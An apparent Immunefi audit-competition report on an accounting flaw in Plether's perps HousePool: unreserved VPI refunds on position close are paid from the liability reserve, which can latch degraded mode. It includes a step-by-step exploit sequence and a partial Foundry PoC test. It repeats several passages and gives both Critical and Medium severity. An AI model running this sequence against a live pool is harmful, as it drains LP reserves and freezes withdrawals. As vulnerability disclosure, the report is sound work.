# \#98123 [SC-Critical] Close-path VPI refund is funded from the liability reserve because the refund obligation is never reserved, breaching the settlement buffer and latching degraded mode

**Submitted on Nov 5th 2026 at 08:24:44 UTC by @kujen for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98123
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Protocol insolvency

## Description

## Brief/Intro
The perps pool charges virtual price impact (VPI) when a trade pushes the book further out of balance, and refunds it when the trade is unwound. The charge is cash that arrives in `HousePool`; the refund is cash that leaves it. Reading the two halves side by side, the charge is booked as distributable LP revenue the moment it lands and the refund is never reserved anywhere, so the pool publishes money it owes back as LP-withdrawable free cash. When the refund eventually comes due, the close-path gate that funds it reserves only outstanding trader claims, so it takes the money out of the reserve that backs other traders' max-profit payouts.

Two of the design's stated guarantees break together.

`PROPERTIES.md` S8: "LP redemption funding never spends trader-claim, liability or settlement-buffer money." The LP redemption in the PoC is funded entirely out of cash the protocol classified as free, yet 1,295,293,111 atoms of that cash were a refund the pool owed back, so the subsequent refund had to come out of the liability reserve and the settlement buffer.

`PROPERTIES.md` S2: `withdrawalReservedAssets == L + totalTraderClaimBalanceAssets + ceil(L * settlementBufferBps / 10000)`. The identity holds arithmetically, which is the problem: the right-hand side is missing the aggregate VPI-refund obligation, so the reservation is complete with respect to its own definition and incomplete with respect to what the pool actually owes.

Downstream, `PROPERTIES.md` S1 (`not degraded => E - claims >= max(long.maxProfit, short.maxProfit)`) is violated in the third test, where `E = 1,798,747,597,406 < L = 1,800,000,000,000`, and the engine only notices after the money has left.

- `PROPERTIES.md` S1 (`not degraded => E - claims >= max(long.maxProfit, short.maxProfit)`). Measured violation: `E = 2,727,313,626,014` against `L = 2,733,600,000,000`, so effective assets sit 6,286,373,986 atoms below the liability envelope at the block where the latch sets, and `maxLiability` never moved (`assertEq(lAfter, liabilityBefore)`).
- `PROPERTIES.md` S8 (LP redemption funding never spends trader-claim, liability or buffer money). The close pays 13,120,373,986 atoms of refund after the LP exit has already taken `getFreeAssets()` to zero, so the refund is drawn from the reserve that backs the outstanding trader claims.
- The recovery behavior the design implies, that an owner recapitalization restores withdrawal capacity, does not hold for a bare `recapitalizePool`. The inflow is queued as a pending claimant bucket and the withdrawal snapshot subtracts that bucket, so the pool's published free cash is unchanged by the top-up.

The pool's withdrawal reservation must cover everything it owes: free cash is only what sits above the aggregate max-profit liability envelope plus the settlement buffer, and no outflow may spend that reserve. In one line, `withdrawalReservedAssets >= maxLiability + totalTraderClaimBalanceAssets + settlementBuffer + aggregateVpiRefundOwed`, and `E - L >= B` must still hold after any refund is paid. The refund term is absent from `HousePoolAccountingLib.buildWithdrawalSnapshot` (`packages/perps/src/libraries/HousePoolAccountingLib.sol:46-55`), and the second clause breaks in the executed PoC: after the close, `E = 1,798,747,597,406` against `L = 1,800,000,000,000`, so the reserve that backs every other open position is short by 1,252,402,594 atoms.

## Vulnerability Details
Two halves of the same accounting gap.

**The refund obligation is never reserved.** `HousePoolAccountingLib.buildWithdrawalSnapshot` (`packages/perps/src/libraries/HousePoolAccountingLib.sol:46-55`) computes the pool's reservation as:

```solidity
snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets =
    snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
```

`supplementalReservedAssets` is the settlement buffer. There is no term for the pool's outstanding VPI-refund obligation, and grepping `packages/perps/src` finds no aggregate of `position.vpiAccrued` at all; the field exists only per position (`packages/perps/src/CfdTypes.sol:41`). Meanwhile the incoming charge is credited straight into spendable pool value: `CfdEngineSettlementSidecar.sol:456-466` records it as `ClaimantInflowKind.Revenue` with `ClaimantInflowCashMode.CashArrived`, and `HousePool.recordClaimantInflow:646-651` only parks revenue in the pending bucket when `seniorPrincipal + juniorPrincipal == 0`, so in any live pool it lands in `accountedAssets` immediately. `maxLiability` does not move when VPI is paid, so `getFreeAssets()` rises by the full charge in the same transaction.

The asymmetry is explicit in the code. `CfdEnginePlanLib._negativeVpiReserveTarget` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:48-55`) fires only when `vpiAccrued < 0` and locks the trader's own collateral so the pool can claw a past refund back. The protocol reserves against a VPI refund flowing back to it, and does not reserve against one it owes.

**The close-path refund is funded from protected cash.** In `_planClose`, the action rebate is capped like this (`packages/perps/src/libraries/CfdEnginePlanLib.sol:970-977`):

```solidity
freePoolCashAssets =
CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets)
.freeCashAssets;
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
    delta.actionRebateWaivedAssets = delta.actionRebateAssets - delta.actionRebatePaidAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}
```

`CashPriorityLib.reserveFreshPayouts` reserves outstanding trader claims and nothing else (`packages/perps/src/libraries/CashPriorityLib.sol:58-67`), so `freeCashAssets` is `poolCash - traderClaims`. Neither `maxLiability` nor the settlement buffer is subtracted. Eleven lines further down, the same function computes free cash for the protocol's own fee top-up through a different helper (`CfdEnginePlanLib.sol:985-987` into `_freePoolCashForProtocolFee` and `_freePoolCashAfterLiabilityReserves:1022-1033`), and that one does subtract `maxLiabilityAfterClose`, the claims, the settlement buffer, `poolAdditionalReservedAssets` and the new revenue reserve. Two reserve standards in one function: the protocol's fee is protected from the liability reserve, the trader's refund is not. `HousePool.payOut:605-615` adds no guard of its own, it is `accountedAssets -= amount; safeTransfer(...)`, so the planner gate is the entire defence.

The identical payment on the open path *is* strictly gated. `delta.poolRebatePayoutAssets` (`CfdEnginePlanLib.sol:333`) is rejected when it exceeds pool cash (`:729-733`) and then has to survive `previewPostOpSolvency` plus `hasRequiredSettlementBuffer` (`:755-772`), so `E >= L + B` must still hold after paying it. The same economic payment at close has no such check.

The "closes are always allowed" rule does not cover this. That rule exists so a trader can always exit, and a close's *price* payout is self-funding: the closed slice's max-profit reduction `R` always dominates its realized gain `P`, because for `Side.LONG` `R = closedEntryCost >= P = closedEntryCost - lots*p` and for `Side.SHORT` `R = lots*cap - closedEntryCost >= P = lots*p - closedEntryCost` with `p` clamped to `cap` at `CfdMath.sol:60`. So `E - L` is monotone non-decreasing across a price-only close, which is exactly why the loose gate is harmless at `CfdEnginePlanLib.sol:958` and `:1539`. An action rebate releases no liability, so it erodes `E - L` one for one, and the trader exits perfectly well without it.

What makes the refund escape the position's own liability footprint is `getMaxLiability` taking the max rather than the sum (`packages/perps/src/libraries/SolvencyAccountingLib.sol:69-74`). That max is the correct bound at a single mark, since `P_long(p)` is convex decreasing, `P_short(p)` is convex increasing, and a convex sum on `[0, cap]` peaks at an endpoint where it equals `L_long` or `L_short`. But it means a position on the side that is *not* currently setting `L` releases nothing when it closes. Because `maxProfit_SHORT = lots*capPrice - entryCost` (`CfdMath.sol:89-90`) while `maxProfit_LONG = entryCost` (`CfdMath.sol:86-87`), any SHORT opened above `capPrice/2` is lighter by max-profit than its own notional, so it can be the heavier side by notional (paying VPI on the way in) while the LONG side keeps setting `L`. Its close then pays the refund and releases zero liability.

A nonzero close refund needs `actionNetAssets < 0` at `CfdEnginePlanLib.sol:1041-1044`, which for a close taking skew from `S` to `S - D` at depth `Dp` is roughly `vpiFactor * (S / Dp) > executionFeeBps / 1e4`. At the engine defaults (`executionFeeBps = 4`, `CfdEngine.sol:148`) that is `vpiFactor * maxSkewRatio > 4e-4`. `vpiFactor` carries no upper bound in `CfdEngineAdmin._validateRiskParams:257-281`, which checks only `maxSkewRatio <= WAD`, and the code is not deployed, so the parameter is not yet fixed. The PoC uses `vpiFactor = 0.001e18` with `maxSkewRatio = 1e18`, which is the same `vpiFactor` the project's own `test/perps/accounting/fees/VpiChunking.t.sol:62` uses.

Two of the design's stated guarantees break together.

`PROPERTIES.md` S8: "LP redemption funding never spends trader-claim, liability or settlement-buffer money." The LP redemption in the PoC is funded entirely out of cash the protocol classified as free, yet 1,295,293,111 atoms of that cash were a refund the pool owed back, so the subsequent refund had to come out of the liability reserve and the settlement buffer.

`PROPERTIES.md` S2: `withdrawalReservedAssets == L + totalTraderClaimBalanceAssets + ceil(L * settlementBufferBps / 10000)`. The identity holds arithmetically, which is the problem: the right-hand side is missing the aggregate VPI-refund obligation, so the reservation is complete with respect to its own definition and incomplete with respect to what the pool actually owes.

Downstream, `PROPERTIES.md` S1 (`not degraded => E - claims >= max(long.maxProfit, short.maxProfit)`) is violated in the third test, where `E = 1,798,747,597,406 < L = 1,800,000,000,000`, and the engine only notices after the money has left.

Any account that can open and close a position, plus one LP exit in between. No privileged role, no oracle control, no flash loan, no price movement; every price in the PoC is 1.6e8.

Preconditions, stated plainly:

1. The risk configuration must satisfy `vpiFactor * maxSkewRatio > executionFeeBps / 1e4`, otherwise the close-leg execution fee swallows the VPI refund and `actionNetAssets` never goes negative. At the engine defaults that threshold is `4e-4`. `CfdEngineAdmin._validateRiskParams:257-281` places no upper bound on `vpiFactor`, and the contracts are not deployed, so the value is still open. The PoC uses `0.001e18 * 1e18`, where `0.001e18` is the project's own `VpiChunking.t.sol` value.
2. The attacker's position must sit on the side that is heavier by notional but lighter by max-profit, so that its close releases no liability. Because `maxProfit_SHORT = lots*capPrice - entryCost`, any SHORT entered above `capPrice/2` qualifies; the PoC enters at 1.6e8 against a 2e8 cap.
3. The pool must be near its reserve floor when the close lands. This is the steady state of a capital-efficient pool, since the open gate only requires `E >= L + B` and `getFreeAssets()` invites LPs to take the rest. The PoC reaches it by having the LP redeem its permitted maximum, which the protocol funds voluntarily.

The attacker and the LP can be the same party, in which case the refund is collected from the reserve as profit rather than handed to a third-party LP.

Measured by the executed test, not inferred:

| Quantity | Before attacker open | After attacker open | After LP exit | After close |
|---|---|---|---|---|
| `pool.totalAssets()` | 5,002,728,682,305 | 5,004,023,975,416 | 1,804,500,000,000 | 1,803,924,992,062 |
| `pool.getFreeAssets()` | 3,198,228,682,305 | 3,199,523,975,416 | 0 | 0 |
| `maxLiability` L | 1,800,000,000,000 | 1,800,000,000,000 | 1,800,000,000,000 | 1,800,000,000,000 |
| settlement buffer B | 4,500,000,000 | 4,500,000,000 | 4,500,000,000 | 4,500,000,000 |
| `degradedMode` | false | false | false | false |

`attacker vpiAccrued = 1,295,293,111`; `getFreeAssets` growth on that single open `= 1,295,293,111`, equal atom for atom. `E - L` falls from 4,500,000,000 to 3,924,992,062 across the close while `L` is unchanged.

At `vpiFactor = 0.005e18`: `vpiAccrued = 6,472,695,062`, post-close `E = 1,798,747,597,406` against `L = 1,800,000,000,000`, shortfall 1,252,402,594, `degradedMode = true`.

1. A LONG book of 1,800,000 USDG notional exists at price 1.6e8, setting `L = 1,800,000,000,000`.
2. A SHORT of 4,500,000 USDG notional pushes the book short-heavy. Skew is now 2,700,000 USDG.
3. The attacker opens a SHORT of 1,800,000 USDG notional, taking skew to 4,500,000 USDG, and pays 1,295,293,111 atoms of VPI. Short-side max-profit rises to 1,575,000,000,000, still below the long side, so `L` does not move. `pool.getFreeAssets()` rises by the full 1,295,293,111 atoms.
4. The junior LP requests and claims a redeem of its permitted maximum. `HousePool` funds it down to exactly `L + B`, leaving `getFreeAssets() == 0`. The attacker's VPI went out of the door with it.
5. The attacker closes the SHORT. `actionNetAssets` is negative, the rebate gate measures free cash as `poolCash - traderClaims` and finds the whole reserve available, and the refund is paid.
6. `E - L` is now below `B`, the engine's own settlement-buffer test fails and new opens are refused. With a larger `vpiFactor` the refund exceeds `B` and `E` falls below `L`, latching degraded mode until the owner recapitalizes.

Size the position so the VPI paid on the way in exceeds both legs' execution fees, keep it on the side that is not setting `L` so the close gives nothing back, and let the pool's own free-cash figure hand the charge to an exiting LP before unwinding. The lifetime clamp at `CloseAccountingLib.sol:111-113` caps each round's refund at the VPI that position paid, so the extraction is per-round bounded and repeatable rather than unbounded in one shot.

- `PROPERTIES.md` S1 (`not degraded => E - claims >= max(long.maxProfit, short.maxProfit)`). Measured violation: `E = 2,727,313,626,014` against `L = 2,733,600,000,000`, so effective assets sit 6,286,373,986 atoms below the liability envelope at the block where the latch sets, and `maxLiability` never moved (`assertEq(lAfter, liabilityBefore)`).
- `PROPERTIES.md` S8 (LP redemption funding never spends trader-claim, liability or buffer money). The close pays 13,120,373,986 atoms of refund after the LP exit has already taken `getFreeAssets()` to zero, so the refund is drawn from the reserve that backs the outstanding trader claims.
- The recovery behavior the design implies, that an owner recapitalization restores withdrawal capacity, does not hold for a bare `recapitalizePool`. The inflow is queued as a pending claimant bucket and the withdrawal snapshot subtracts that bucket, so the pool's published free cash is unchanged by the top-up.

- **Role**: unprivileged EOA. No owner, operator, router, vault or admin role.
- **Capital**: the junior tranche position the LP-exit leg needs plus trading collateral. The run below uses 20,000,000 USDG of junior deposit and 1,000,000 USDG of trading collateral.
- **Permissions**: `HousePool` deposit and redeem through the junior vault, `CfdEngine.processOrderTyped` through the router, `claimRedeem`. All public entrypoints.
- **Initial state**: both tranches seeded and an active mark, which is the post-launch steady state.
- **Constraints**: the attacker's position has to define `maxLiability` while being the larger side by notional. A SHORT does that in this book, because a long's max profit is its full entry cost and a short's is `lots*capPrice - entryCost`, so a single short sets `L` while the skew charge is priced off its notional.

1. Two books open 2,733,601 USDG notional each, one long and one short, at price 1.6e8. `L` becomes 2,733,600,000,000, `D = poolAssets - traderClaims = 20,502,000,000,000`, and the skew cap is `4e17 * D / 1e18 = 8,200,800,000,000`.
2. The attacker opens a SHORT for the remaining 8,200,800 USDG of skew cap. The open pays `vpiAccrued = 16,401,599,870` atoms into the pool. `L` does not move.
3. The attacker redeems its junior shares. The permitted withdrawal is the cash above `L + B`, so the request is funded only up to that cap; after the exit `poolAssets = 2,740,434,000,000`, `E - L = 6,834,000,000 = B`, `getFreeAssets() == 0`, and the pool still reports solvent. The unfunded remainder of the attacker's request stays at the queue head for the rest of the sequence.
4. An ordinary LP (`VICTIM_LP`, 500,400,023,013 atoms of junior principal) requests a redemption. Its epoch starts two epochs out.
5. The attacker closes the SHORT. The close refunds the accrued VPI net of the close fee: 16,401,599,870 atoms were paid in, 13,120,373,986 come back out. `L` is unchanged, `poolAssets` drops to 2,727,313,626,014, and `E < L` by 6,286,373,986. `_enterDegradedModeIfInsolvent` latches.
6. From that block every LP epoch settlement reverts `HousePool__DegradedMode` (`0x9f7adff3`, `HousePool.sol:1858-1885`), `getMaxJuniorWithdraw()` reads zero, and fresh opens are refused with `CfdEngine__TypedOrderFailure(2, 2, false)` where category 2 is `ProtocolStateInvalidated` and code 2 is `DEGRADED_MODE` (`CfdEnginePlanLib.sol:296-335`).
7. The owner cannot clear the latch while the pool is short (`CfdEngine__StillInsolvent`, `CfdEngine.sol:633-668`). The attacker cannot clear it at all because the function is `onlyOwner`.
8. The owner recapitalizes 513,521,396,999 atoms. The latch clears. The whole inflow is now in `pendingRecapitalizationAssets`, `getFreeAssets()` is still zero, and settlement now reverts `HousePool__NoLpEpochProgress`.
9. The owner calls `assignUnassignedAssets(false, receiver)`. That reconciles, moves the bucket into `unassignedAssets`, and then into `juniorPrincipal`. `getFreeAssets()` reads 500,401,023,013 and settlement funds the queue head.

- **Call sequence**: `processOrderTyped(SHORT, capSkew)` into `requestRedeem(all junior shares)` into `settleLpEpoch` into `claimRedeem` into `processOrderTyped(close SHORT)`.
- **Ordering**: the LP exit must complete before the close. After the close the pool is latched, so the exit cannot be priced and the remaining cash stays inside.
- **Invariant violated**: `E - claims >= max(long.maxProfit, short.maxProfit)`.
- **Cost to the attacker**: the close fee, 3,281,225,884 atoms (16,401,599,870 minus 13,120,373,986). The sequence is not profitable, which is why this reads as griefing with a price rather than theft. A griefer spends roughly 3,281 USDG to remove 6,286 USDG from the liability reserve and freeze every redemption in a 20,502,000 USDG pool.
- **Damage**: the settlement buffer is consumed, effective assets end below the aggregate max-profit envelope, and LP redemptions stop until the owner funds 513,521,396,999 atoms and routes them into principal.

The pool's withdrawal reservation must cover everything it owes: free cash is only what sits above the aggregate max-profit liability envelope plus the settlement buffer, and no outflow may spend that reserve. In one line, `withdrawalReservedAssets >= maxLiability + totalTraderClaimBalanceAssets + settlementBuffer + aggregateVpiRefundOwed`, and `E - L >= B` must still hold after any refund is paid. The refund term is absent from `HousePoolAccountingLib.buildWithdrawalSnapshot` (`packages/perps/src/libraries/HousePoolAccountingLib.sol:46-55`), and the second clause breaks in the executed PoC: after the close, `E = 1,798,747,597,406` against `L = 1,800,000,000,000`, so the reserve that backs every other open position is short by 1,252,402,594 atoms.

## Impact Details
The pool pays a refund out of cash it had already reserved for other traders' max-profit payouts, and the reservation accounting never knew the refund was owed.

Measured in the PoC at `vpiFactor = 0.001e18`: `pool.getFreeAssets()` grows by exactly the 1,295,293,111 atoms of VPI the position paid in, the LP withdraws the protocol's own permitted maximum and leaves the pool on exactly `L + B = 1,804,500,000,000` with `getFreeAssets() == 0`, and the close then drives `E - L` from 4,500,000,000 down to 3,924,992,062 while `L` stays at 1,800,000,000,000. `SolvencyAccountingLib.hasRequiredSettlementBuffer(E, L, 25)` is false afterwards, and that is the same predicate the open gate enforces at `CfdEnginePlanLib.sol:770`, so new position opens stop being admissible. The headroom the settlement buffer exists to guarantee is gone and the engine still reports `degradedMode == false`.

At `vpiFactor = 0.005e18` the refund is 6,472,695,062 atoms, exceeds the 4,500,000,000 atom buffer outright, and the post-close state is `E = 1,798,747,597,406` against `L = 1,800,000,000,000`. That is a 1,252,402,594 atom shortfall against the envelope that backs the remaining open positions, and `_enterDegradedModeIfInsolvent` (`packages/perps/src/CfdEngine.sol:1352-1371`) latches `degradedMode = true`. Degraded mode blocks new opens and LP withdrawals, and clearing it needs the owner to recapitalize and call `clearDegradedMode`, which reverts with `CfdEngine__StillInsolvent` until `E >= L` again (`CfdEngine.sol:659-668`).

The value is not destroyed, it is moved: the exiting LP captured the refund the pool owed, and the shortfall lands on the liability reserve backing positions that had nothing to do with the trade. An actor who is both the junior LP and the trader collects it directly, opening the position to pay the VPI, exiting the vault once the charge has been published as free cash, then closing to collect the refund from the reserve. The refund is bounded by the position's own `vpiAccrued` because of the lifetime clamp at `CloseAccountingLib.sol:111-113`, so the per-round extraction is capped, but it is repeatable and each round leaves the pool a little further under-reserved.

A trader's close drains the pool's protected settlement headroom and, once the refund exceeds the buffer, drives effective assets below the aggregate max-profit liability envelope that backs every other open position. Measured shortfall in the third test is 1,252,402,594 atoms against a 1,800,000,000,000 atom envelope, with `degradedMode` latched. Degraded mode stops new opens and LP withdrawals and only clears after an owner recapitalization. The refund value itself leaves with whichever LP exits between the open and the close, so an actor holding both roles extracts it from reserves that were never theirs; the lifetime clamp bounds each round to that position's own paid VPI, making this a repeatable drain rather than a single large theft. Rated Medium rather than High because it needs a specific risk-parameter relation (`vpiFactor * maxSkewRatio > executionFeeBps / 1e4`) and an LP exit in the window.

- actor: victim_lp
  asset: juniorVault.balanceOf(victim)
  delta: -500004566269983
  reason: shares escrowed into a redemption epoch that no settlement could fund while the latch was set
- actor: protocol
  asset: engine effective assets minus maxLiability
  delta: -13120373986
  reason: close-path VPI refund drawn from the liability reserve, taking the surplus over the envelope from plus 6834000000 to minus 6286373986
- actor: protocol
  asset: pool.getFreeAssets()
  delta: -17777967761847
  reason: free cash falls to zero after the attacker LP exit and stays zero through the latch and the bare recapitalization
- actor: attacker
  asset: settlementToken net of the VPI round trip
  delta: -3281225884
  reason: 16401599870 atoms paid in on the open against 13120373986 refunded on the close, so the freeze costs the attacker the close fee
- actor: owner
  asset: settlementToken.balanceOf(owner)
  delta: -513521396999
  reason: recapitalization that clears the latch and is then routed into junior principal

- actor: junior LP (withdrawing holder)
  asset: HousePool cash redeemed before the close, from 5004023975416 to 1804500000000
  delta: +3199523975416
  reason: redeems its permitted maximum out of cash the pool published as free, including the 1295293111 atoms it owed back to the trader
- actor: trader closing the position
  asset: close-path VPI refund credited by HousePool
  delta: +1295293111
  reason: the close released no liability, but the refund obligation was never reserved, so the refund is paid instead of waived
- actor: protocol (HousePool liability reserve and settlement buffer)
  asset: effective assets above maxLiability, E - L
  delta: -575007938
  reason: the refund is paid after getFreeAssets() is already zero, so E - L falls from 4500000000 to 3924992062 against a 4500000000 buffer while maxLiability stays at 1800000000000

Protocol insolvency

## References
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:970-977` (close action-rebate funding gate)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:985-987` and `:1022-1033` (the strict gate used for the protocol's own fee in the same function)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:729-733` and `:755-772` (the strict gate applied to the identical open-path rebate)
- `packages/perps/src/libraries/CashPriorityLib.sol:58-67` (reserves trader claims only)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:46-55` (reservation with no refund-obligation term)
- `packages/perps/src/libraries/SolvencyAccountingLib.sol:69-74` and `:94-105` (max-not-sum envelope, buffer predicate)
- `packages/perps/src/HousePool.sol:605-615` (`payOut`, no reserve guard) and `:646-651` (revenue not queued in a live pool)
- `packages/perps/src/CfdEngineSettlementSidecar.sol:456-466` (VPI booked as CashArrived revenue) and `:620-626` (refund paid via `payOut`)
- `packages/perps/src/CfdEngine.sol:1352-1371` (degraded latch) and `:659-668` (`clearDegradedMode`)
- `packages/perps/src/CfdMath.sol:60`, `:86-90` (price clamp and the per-side max-profit envelopes)
- `packages/perps/src/CfdEngineAdmin.sol:257-281` (`vpiFactor` has no upper bound)

## Proof of Concept

## Proof of Concept

**PoC 1 of 2, the reserve raid (the core bug).** Run from `packages/perps`: `forge test --match-path 'test/perps/poc/NumericalGap_VpiRebateReserveRaid.t.sol' -vv`.

Complete runnable test, also persisted at `.poc/vpi-rebate-unreserved-liability-reserve/NumericalGap_VpiRebateReserveRaid.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";

import {SolvencyAccountingLib} from "@plether/perps/libraries/SolvencyAccountingLib.sol";

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {VpiMockSettlementToken6} from "../shared/CfdEngineTestBase.sol";

contract NumericalGap_VpiRebateReserveRaid is Test {

    VpiMockSettlementToken6 settlementToken;
    CfdEngine engine;
    HousePool pool;
    TrancheVault juniorVault;
    TrancheVault seniorVault;
    MarginClearinghouse clearinghouse;

    uint256 constant CAP_PRICE = 2e8;
    // above CAP/2, so a SHORT's endpoint envelope lots*CAP-entryCost is smaller than its own notional
    uint256 constant PRICE = 1.6e8;
    uint256 constant JUNIOR_DEPOSIT = 5_000_000 * 1e6;

    address constant LONG_BOOK = address(0x1B);
    address constant SKEWER = address(0x51);
    address constant ATTACKER = address(0xA7);
    address constant LP = address(0x1D);

    uint256 vpiFactorForRun = 0.001e18;

    function getAccountReservations(
        address
    ) external pure returns (IOrderRouterAccounting.AccountReservationView memory reservation) {
        return reservation;
    }

    function getMarginReservationIds(
        address
    ) external pure returns (uint64[] memory) {
        return new uint64[](0);
    }

    function syncMarginQueue(
        address
    ) external pure {}

    function _riskParams(
        uint256 vpiFactor
    ) internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: vpiFactor,
            maxSkewRatio: 1e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _configureBroadSeniorCapacity() internal {
        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: type(uint256).max - 1,
            maxSeniorShareBps: 9999
        });
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function _deployStack(
        uint256 vpiFactor
    ) internal {
        settlementToken = new VpiMockSettlementToken6();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(vpiFactor), 50);
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalBook));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        engine.setOrderRouter(address(this));
        clearinghouse.setEngine(address(engine));
        _configureBroadSeniorCapacity();
        vm.warp(1_709_532_000);

        settlementToken.mint(address(this), 2000e6);
        settlementToken.approve(address(pool), 2000e6);
        pool.initializeSeedPosition(false, 1000e6, address(this));
        pool.initializeSeedPosition(true, 1000e6, address(this));
        pool.activateTrading();

        settlementToken.mint(LP, JUNIOR_DEPOSIT);
        vm.startPrank(LP);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        uint256 requestId = juniorVault.requestDeposit(JUNIOR_DEPOSIT, LP, LP);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, LP);
        vm.prank(LP);
        juniorVault.claimDeposit(requestId, claimable, LP, LP);

        // clear the vault's own deposit cooldown so a later redeem request is not blocked by it
        _warpAndRefreshMark(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
    }

    function _warpAndRefreshMark(
        uint256 timestamp
    ) internal {
        if (timestamp > block.timestamp) {
            vm.warp(timestamp);
        }
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

    function setUp() public {
        _deployStack(vpiFactorForRun);
    }

    function _deposit(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _sizeForNotional(
        uint256 notionalAtoms
    ) internal pure returns (uint256) {
        return (notionalAtoms / PRICE) * CfdTypes.SIZE_QUANTUM;
    }

    function _open(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        engine.processOrderTyped(
            CfdTypes.Order({
                account: account,
                sizeDelta: size,
                marginDelta: margin,
                targetPrice: PRICE,
                commitTime: uint64(block.timestamp),
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: false
            }),
            PRICE,
            pool.totalAssets(),
            uint64(block.timestamp)
        );
    }

    function _close(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        engine.processOrderTyped(
            CfdTypes.Order({
                account: account,
                sizeDelta: size,
                marginDelta: 0,
                targetPrice: 0,
                commitTime: uint64(block.timestamp),
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: true
            }),
            PRICE,
            pool.totalAssets(),
            uint64(block.timestamp)
        );
    }

    function _maxLiability() internal view returns (uint256) {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        return longMax > shortMax ? longMax : shortMax;
    }

    function _effectiveAssets() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _buffer() internal view returns (uint256) {
        return SolvencyAccountingLib.settlementBufferTargetAssets(_maxLiability(), engine.settlementBufferBps());
    }

    function _report(
        string memory label
    ) internal view {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        console2.log("---", label);
        console2.log("  poolAssets       ", pool.totalAssets());
        console2.log("  pool.getFreeAssets", pool.getFreeAssets());
        console2.log("  effectiveAssets E", _effectiveAssets());
        console2.log("  maxLiability   L ", _maxLiability());
        console2.log("  settlementBuf  B ", _buffer());
        console2.log("  longMaxProfit    ", longMax);
